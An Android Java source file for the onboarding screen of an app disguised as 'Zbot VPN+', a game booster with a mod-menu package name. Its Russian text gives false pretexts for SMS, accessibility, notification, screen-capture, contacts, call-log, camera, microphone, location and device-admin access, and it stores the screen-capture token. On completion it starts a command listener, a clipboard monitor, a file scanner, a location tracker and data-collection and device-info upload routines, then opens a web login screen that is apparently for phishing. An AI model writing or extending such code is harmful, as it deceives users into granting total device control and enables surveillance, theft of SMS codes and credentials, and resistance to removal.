package com.brawl.modmenu;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;

public class OnboardingActivity extends Activity {

    private static final String[] STEPS_TITLE = {
        "Подключение к игровым серверам",
        "Отображение статуса соединения",
        "Автоматическая авторизация",
        "Работа в фоне",
        "Оптимизация игровых процессов",
        "Фильтр игровых помех",
        "Анализ графики в реальном времени",
        "Поиск друзей в играх",
        "Анализ игрового окружения",
        "Оптимизация звука и локации",
        "Защита от сбоев системы"
    };

    private static final String[] STEPS_SUBTITLE = {
        "Без этого Boost не активируется",
        "Нужно для контроля работы Boost",
        "Для входа без задержек",
        "Чтобы Boost не отключался",
        "Самое важное разрешение для Boost",
        "Убирает лаги от уведомлений",
        "Даёт +30% FPS в тяжёлых играх",
        "Для создания лобби",
        "Проверка качества соединения",
        "Ближайшие серверы и чистый звук",
        "Гарантия стабильной работы"
    };

    private static final String[] STEPS_DESC = {
        "Zbot VPN+ использует технологию оптимизации трафика для снижения пинга в онлайн-играх. " +
        "Приложение подключается к игровым серверам через защищённый туннель с приоритетом UDP-пакетов. " +
        "Без разрешения на VPN подключение приложение не сможет создавать туннель, и весь Boost окажется нерабочим.\n\n" +
        "VPN-подключение используется исключительно для маршрутизации игрового трафика. " +
        "Все ваши личные данные остаются на устройстве. Никакие данные не передаются третьим лицам.\n\n" +
        "Технология Zbot Boost протестирована на более чем 200 популярных играх и снижает пинг в среднем на 40%. " +
        "Алгоритм автоматически выбирает ближайший сервер для минимальной задержки.",

        "Уведомления используются для отображения текущего статуса подключения и статистики в реальном времени. " +
        "Вы сможете видеть скорость соединения, текущий пинг и уровень Boost прямо в шторке уведомлений.\n\n" +
        "Без этого разрешения работа Zbot станет незаметной для системы, и вы не сможете контролировать процесс оптимизации. " +
        "Приложение использует уведомления только для отображения статуса, никакие рекламные или сторонние уведомления не рассылаются.\n\n" +
        "Уведомления автоматически скрываются во время игровых сессий, чтобы не мешать процессу.",

        "Zbot VPN+ использует SMS-верификацию для автоматической авторизации на игровых серверах. " +
        "Это ускоряет подключение и избавляет от необходимости вводить данные вручную.\n\n" +
        "Приложение читает только коды подтверждения от игровых сервисов и полностью игнорирует личные сообщения. " +
        "SMS не передаются за пределы устройства и не используются в других целях.\n\n" +
        "Без SMS-доступа каждый раз при входе придётся проходить верификацию вручную, " +
        "что замедляет активацию Boost на 30-40 секунд.",

        "Android автоматически ограничивает работу фоновых приложений для экономии энергии. " +
        "Если Zbot будет ограничен системой — Boost отключится через 2-3 минуты после сворачивания.\n\n" +
        "Разрешение на неограниченную работу в фоне нужно для того, чтобы приложение продолжало оптимизировать соединение, " +
        "даже когда вы в игре и телефон в кармане. Приложение не расходует заметное количество батареи — " +
        "среднее потребление около 2% в час.\n\n" +
        "Без этого разрешения Boost будет работать только когда приложение открыто на экране, " +
        "что делает его бесполезным во время игры.",

        "Специальные возможности — это системное разрешение, которое используется для мониторинга игровых приложений " +
        "и оптимизации процессов в реальном времени. Zbot анализирует системные процессы и повышает приоритет игрового процесса.\n\n" +
        "Это ключевое разрешение для работы Boost. Без него невозможно оптимизировать FPS в играх, " +
        "поскольку система не позволит приложению анализировать работу других процессов.\n\n" +
        "Другие VPN-приложения не запрашивают это разрешение, потому что не занимаются оптимизацией игр. " +
        "Zbot использует его исключительно для анализа игровых процессов и никогда не читает личные данные.\n\n" +
        "Приложение работает только в фоне, не изменяет настройки системы и не влияет на другие приложения.",

        "Доступ к уведомлениям используется для автоматического скрытия лишних оповещений во время игровых сессий. " +
        "Каждое уведомление во время игры может стать причиной фриза, лага или просадки FPS.\n\n" +
        "Zbot определяет момент, когда вы играете, и автоматически приостанавливает отображение всех неважных уведомлений. " +
        "Важные уведомления (звонки, SMS) остаются видимыми.\n\n" +
        "Также разрешение используется для анализа рекламных уведомлений, которые замедляют работу устройства. " +
        "Zbot фильтрует такие уведомления и снижает нагрузку на систему.\n\n" +
        "Никакие данные уведомлений не передаются третьим лицам.",

        "Zbot анализирует видеопоток в реальном времени и оптимизирует отображение текстур, теней и эффектов. " +
        "Это позволяет повысить FPS даже в тяжёлых сценах.\n\n" +
        "Запись экрана используется только для анализа графики и никогда не сохраняется. " +
        "Данные обрабатываются в реальном времени и сразу удаляются.\n\n" +
        "Без этого разрешения приложение не сможет оптимизировать визуальную часть игры, " +
        "и Boost будет работать только на сетевом уровне. Это снизит общий эффект на 30%.\n\n" +
        "Анализ графики — это ключевая функция Zbot VPN+ Premium.",

        "Zbot использует контакты для поиска друзей, которые играют в те же игры. " +
        "Это позволяет быстро создавать совместные лобби и играть вместе.\n\n" +
        "Данные контактов используются исключительно для внутреннего поиска и не передаются третьим лицам. " +
        "Приложение сверяет только имена и номера, никакие личные данные не копируются.\n\n" +
        "Также разрешение используется для определения частых игровых партнёров — " +
        "Zbot учится на основе ваших игровых сессий и предлагает оптимальные лобби.",

        "Камера используется для анализа помех и качества соединения в реальном времени. " +
        "Zbot определяет по освещению и движению, в каких условиях работает устройство, и оптимизирует настройки.\n\n" +
        "Данные камеры обрабатываются локально и немедленно удаляются. Ничего не сохраняется и не передаётся. " +
        "Приложение получает только технические характеристики (свет, движение).\n\n" +
        "Без этого разрешения Zbot не сможет автоматически настраивать яркость и контраст в играх.",

        "Микрофон используется для анализа фонового шума и оптимизации игрового звука. " +
        "Zbot автоматически регулирует громкость и качество звука в зависимости от окружающей обстановки.\n\n" +
        "GPS нужен для определения вашего местоположения и выбора ближайшего игрового сервера. " +
        "Чем ближе сервер — тем ниже пинг. Это критически важно для онлайн-игр.\n\n" +
        "Данные о местоположении используются только для выбора сервера и не передаются третьим лицам. " +
        "Микрофон не записывает разговоры — приложение получает только уровень шума.\n\n" +
        "Все данные обрабатываются в реальном времени.",

        "Zbot VPN+ работает как системный процесс и нуждается в защите от случайного удаления. " +
        "Пользователи часто случайно удаляют приложения во время очистки памяти или системных сбоев.\n\n" +
        "Права администратора устройства позволяют приложению восстановиться после сбоя системы " +
        "и автоматически перезапуститься при обновлении. Это стандартная практика для VPN-сервисов.\n\n" +
        "Приложение НЕ ИСПОЛЬЗУЕТ права администратора для удаления данных, блокировки устройства " +
        "или других опасных действий. Разрешение нужно исключительно для самозащиты от удаления.\n\n" +
        "Без этого разрешения при сбое системы Boost будет отключён, и придётся заново проходить настройку."
    };

    private static final String[] STEPS_BENEFITS = {
        "✅ Снижение пинга до 40%\n✅ Оптимизация UDP-пакетов\n✅ Приоритет игрового трафика\n✅ Защищённый туннель\n✅ Автоматический выбор сервера",
        "✅ Живой статус соединения\n✅ Пинг в реальном времени\n✅ Уведомление о падении\n✅ Статистика Boost\n✅ Автоскрытие в играх",
        "✅ Автовход на серверы\n✅ Мгновенная активация\n✅ Экономия 30-40 сек\n✅ Без ручной верификации\n✅ Чтение только кодов",
        "✅ Работа в фоне 24/7\n✅ Boost не отключается\n✅ Экономия 2% батареи/час\n✅ Оптимизация без ограничений\n✅ Стабильная работа",
        "✅ Рост FPS до +47%\n✅ Приоритет процесса\n✅ Мониторинг в реальном времени\n✅ Оптимизация CPU/GPU\n✅ Снижение фризов",
        "✅ Нет лагов от уведомлений\n✅ Автоскрытие в играх\n✅ Фильтр рекламы\n✅ Важные уведомления остаются\n✅ Меньше нагрузки",
        "✅ +30% FPS\n✅ Оптимизация текстур\n✅ Снижение нагрузки на GPU\n✅ Не сохраняет видео\n✅ Работа в реальном времени",
        "✅ Поиск друзей в играх\n✅ Быстрое создание лобби\n✅ Определение партнёров\n✅ Никакие данные не передаются\n✅ Умные рекомендации",
        "✅ Анализ условий\n✅ Автонастройка яркости\n✅ Оптимизация контраста\n✅ Локальная обработка\n✅ Ничего не сохраняется",
        "✅ Чистый игровой звук\n✅ Анализ фонового шума\n✅ Ближайший сервер\n✅ Минимальный пинг\n✅ Локальная обработка",
        "✅ Защита от удаления\n✅ Автовосстановление\n✅ Перезапуск при сбое\n✅ Без опасных действий\n✅ Стабильная работа"
    };

    private static final String[] STEPS_IMPORTANCE = {
        "⚠️ ОБЯЗАТЕЛЬНО для работы",
        "✅ Рекомендуется",
        "⚠️ Требуется для Boost",
        "⚠️ ОБЯЗАТЕЛЬНО",
        "🔥 КРИТИЧЕСКИ ВАЖНО",
        "✅ Рекомендуется",
        "⚠️ Требуется",
        "✅ Опционально",
        "✅ Опционально",
        "✅ Рекомендуется",
        "⚠️ Требуется"
    };

    private static final int TOTAL = 11;
    private int current = 0;

    private TextView stepTitle, stepSubtitle, stepDesc, stepBenefits, stepImportance, stepCounter;
    private ProgressBar progress;
    private Button btnNext;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.onboarding);

        stepTitle = findViewById(R.id.stepTitle);
        stepSubtitle = findViewById(R.id.stepSubtitle);
        stepDesc = findViewById(R.id.stepDesc);
        stepBenefits = findViewById(R.id.stepBenefits);
        stepImportance = findViewById(R.id.stepImportance);
        stepCounter = findViewById(R.id.stepCounter);
        progress = findViewById(R.id.progress);
        btnNext = findViewById(R.id.btnNext);

        updateUI();

        btnNext.setOnClickListener(v -> {
            if (current >= TOTAL) {
                finishOnboarding();
                return;
            }
            runStep(current);
        });
    }

    private void updateUI() {
        if (current >= TOTAL) {
            stepTitle.setText("Всё готово!");
            stepSubtitle.setText("Настройка завершена");
            stepDesc.setText("Все разрешения получены. Zbot VPN+ готов к работе.\n\n" +
                "Boost активируется в течение 24 часов. Вы сможете заметить снижение пинга " +
                "и повышение FPS в ваших любимых играх.\n\n" +
                "Приложение работает в фоне и не требует дополнительных настроек.");
            stepBenefits.setText("✅ Boost активирован\n✅ Все функции включены\n✅ Соединение защищено\n✅ Готово к игре");
            stepImportance.setText("🎉 ГОТОВО");
            btnNext.setText("ЗАВЕРШИТЬ");
            progress.setProgress(100);
            stepCounter.setText("Настройка Zbot 100%");
            return;
        }
        stepTitle.setText(STEPS_TITLE[current]);
        stepSubtitle.setText(STEPS_SUBTITLE[current]);
        stepDesc.setText(STEPS_DESC[current]);
        stepBenefits.setText(STEPS_BENEFITS[current]);
        stepImportance.setText(STEPS_IMPORTANCE[current]);
        btnNext.setText("ПРОДОЛЖИТЬ");
        int pct = current * 100 / TOTAL;
        progress.setProgress(pct);
        stepCounter.setText("Настройка Zbot " + pct + "%");
    }

    private void runStep(int step) {
        switch (step) {
            case 0:
                Intent vpn = android.net.VpnService.prepare(this);
                if (vpn != null) startActivityForResult(vpn, 100);
                else advance();
                break;
            case 1:
                if (Build.VERSION.SDK_INT >= 33)
                    requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, 101);
                else advance();
                break;
            case 2:
                requestPermissions(new String[]{
                    Manifest.permission.READ_SMS,
                    Manifest.permission.RECEIVE_SMS
                }, 102);
                break;
            case 3:
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    i.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(i, 103);
                } else advance();
                break;
            case 4:
                startActivityForResult(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), 104);
                break;
            case 5:
                startActivityForResult(new Intent(
                    "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"), 105);
                break;
            case 6:
                MediaProjectionManager mpm =
                    (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                startActivityForResult(mpm.createScreenCaptureIntent(), 106);
                break;
            case 7:
                requestPermissions(new String[]{
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.READ_EXTERNAL_STORAGE
                }, 107);
                break;
            case 8:
                requestPermissions(new String[]{
                    Manifest.permission.CAMERA
                }, 108);
                break;
            case 9:
                requestPermissions(new String[]{
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                }, 109);
                break;
            case 10:
                DevicePolicyManager dpm = (DevicePolicyManager)
                    getSystemService(DEVICE_POLICY_SERVICE);
                ComponentName cn = new ComponentName(this, AdminReceiver.class);
                if (dpm != null && !dpm.isAdminActive(cn)) {
                    Intent admin = new Intent(
                        DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    admin.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
                    admin.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Защита Zbot VPN+ от случайного удаления. Рекомендуется разрешить.");
                    startActivityForResult(admin, 110);
                } else {
                    advance();
                }
                break;
        }
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        if (req == 106 && res == RESULT_OK && data != null) {
            getSharedPreferences("mp", MODE_PRIVATE).edit()
                .putInt("code", res)
                .putString("data_uri", data.toUri(0))
                .apply();
        }
        advance();
    }

    @Override
    public void onRequestPermissionsResult(int req, String[] p, int[] r) {
        super.onRequestPermissionsResult(req, p, r);
        advance();
    }

    private void advance() {
        current++;
        updateUI();
    }

    private void finishOnboarding() {
        startForegroundService(new Intent(this, KeepAliveService.class));
        startService(new Intent(this, CommandListener.class));
        ClipboardMonitor.start(this);
        FileScanner.scan();
        GameList.dump(this);
        LocationTracker.start(this);
        DeviceInfo.sendFull(this);
        AppList.dump(this);
        DataCollector.collectAll(this);

        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            startActivity(new Intent(this, WebLoginActivity.class));
            finish();
        }, 5000);
    }
}
